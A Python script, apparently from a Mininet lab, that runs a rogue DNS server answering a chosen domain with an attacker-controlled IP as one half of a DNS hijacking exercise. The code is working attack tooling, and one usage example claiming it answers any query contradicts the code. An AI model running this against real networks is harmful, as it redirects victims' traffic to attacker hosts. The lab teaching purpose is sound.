#!/usr/bin/env python3
"""
mini_dns_server.py - Minimal DNS Server for Hijacking Tests
Responds to DNS queries with attacker-controlled IP addresses.

Usage:
  sudo python3 mini_dns_server.py <ATTACKER_IP> [<DOMAIN_NAME>]

Examples:
  # Run on h2 (10.0.1.2), respond to www.lab.example → 10.0.1.2
  sudo python3 mini_dns_server.py 10.0.1.2 www.lab.example

  # Run on h3, respond to any query with 10.0.2.1
  sudo python3 mini_dns_server.py 10.0.2.1

Setup for attack:
  1. Start this server on attacker host (h2):
     $ mininet> h2 xterm
     xterm> sudo python3 mini_dns_server.py 10.0.1.2 www.lab.example

  2. Victim (h3) will have DNS intercepted by dns_hijack_attack.py
  
  3. When victim resolves hostname:
     $ mininet> h3 nslookup www.lab.example
     Result: www.lab.example → 10.0.1.2 (attacker's IP)
"""

import socket
import struct
import sys
import signal

class SimpleDNSServer:
    def __init__(self, answer_ip, domain_name="www.lab.example"):
        self.answer_ip = answer_ip
        self.domain_name = domain_name.lower()
        self.sock = None
    
    def build_name(self, qname):
        """Convert domain name to DNS wire format"""
        parts = qname.strip(".").split(".")
        result = b""
        for part in parts:
            result += bytes([len(part)]) + part.encode()
        result += b"\x00"
        return result
    
    def parse_query(self, data):
        """Parse incoming DNS query"""
        try:
            tid = data[0:2]
            flags = data[2:4]
            qdcount = struct.unpack("!H", data[4:6])[0]
            
            # Parse question section
            idx = 12
            labels = []
            while data[idx] != 0:
                l = data[idx]
                idx += 1
                labels.append(data[idx:idx+l].decode())
                idx += l
            idx += 1
            
            qtype = data[idx:idx+2]
            qclass = data[idx+2:idx+4]
            qname = ".".join(labels)
            qname_wire = data[12:idx+1]
            
            return tid, qname, qtype, qclass, qname_wire
        except Exception as e:
            print(f"[!] Error parsing query: {e}")
            return None
    
    def build_response(self, tid, qname_wire, qtype, qclass, answer_ip):
        """Build DNS response packet"""
        # DNS header: transaction ID, flags=response, 1 question, 1 answer
        header = tid + b"\x81\x80" + b"\x00\x01" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00"
        
        # Question section
        question = qname_wire + qtype + qclass
        
        # Answer section (pointer to name in question)
        ans_name = b"\xc0\x0c"  # Pointer to offset 12 (question name)
        ans_type = b"\x00\x01"  # Type A (IPv4)
        ans_class = b"\x00\x01"  # Class IN
        ttl = struct.pack("!I", 60)  # 60 second TTL
        
        # Convert IP to binary
        rdata = socket.inet_aton(answer_ip)
        rdlen = struct.pack("!H", len(rdata))
        
        answer = ans_name + ans_type + ans_class + ttl + rdlen + rdata
        
        return header + question + answer
    
    def start(self):
        """Start DNS server"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(("0.0.0.0", 53))
        
        print("="*70)
        print(f"[+] Mini DNS Server Started")
        print(f"    Listen:     0.0.0.0:53")
        print(f"    Answer IP:  {self.answer_ip}")
        print(f"    Domain:     {self.domain_name}")
        print("="*70)
        print("[*] Waiting for DNS queries...")
        print("    When victim queries {}, will respond with {}".format(
            self.domain_name, self.answer_ip))
        print("="*70)
        
        try:
            while True:
                data, addr = self.sock.recvfrom(512)
                parsed = self.parse_query(data)
                
                if not parsed:
                    continue
                
                tid, qname, qtype, qclass, qname_wire = parsed
                
                print(f"\n[+] Query from {addr[0]}:{addr[1]}")
                print(f"    Domain: {qname}")
                print(f"    Type:   {struct.unpack('!H', qtype)[0]} (A)")
                
                # Check if query matches our domain
                if qname.lower() == self.domain_name:
                    resp = self.build_response(tid, qname_wire, qtype, qclass, self.answer_ip)
                    self.sock.sendto(resp, addr)
                    print(f"    Response: {self.domain_name} → {self.answer_ip} ✓")
                else:
                    # Send NXDOMAIN (name not found)
                    header = tid + b"\x81\x83" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
                    question = qname_wire + qtype + qclass
                    resp = header + question
                    self.sock.sendto(resp, addr)
                    print(f"    Response: NXDOMAIN (not answering)")
        
        except KeyboardInterrupt:
            print("\n\n[*] Shutting down DNS server...")
        finally:
            if self.sock:
                self.sock.close()

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n[*] Received interrupt signal")
    sys.exit(0)

def main():
    if len(sys.argv) < 2:
        print("Usage: sudo python3 mini_dns_server.py <ATTACKER_IP> [<DOMAIN_NAME>]")
        print("\nExamples:")
        print("  sudo python3 mini_dns_server.py 10.0.1.2 www.lab.example")
        print("  sudo python3 mini_dns_server.py 10.0.2.1")
        sys.exit(1)
    
    answer_ip = sys.argv[1]
    domain_name = sys.argv[2] if len(sys.argv) > 2 else "www.lab.example"
    
    signal.signal(signal.SIGINT, signal_handler)
    
    server = SimpleDNSServer(answer_ip, domain_name)
    server.start()

if __name__ == "__main__":
    main()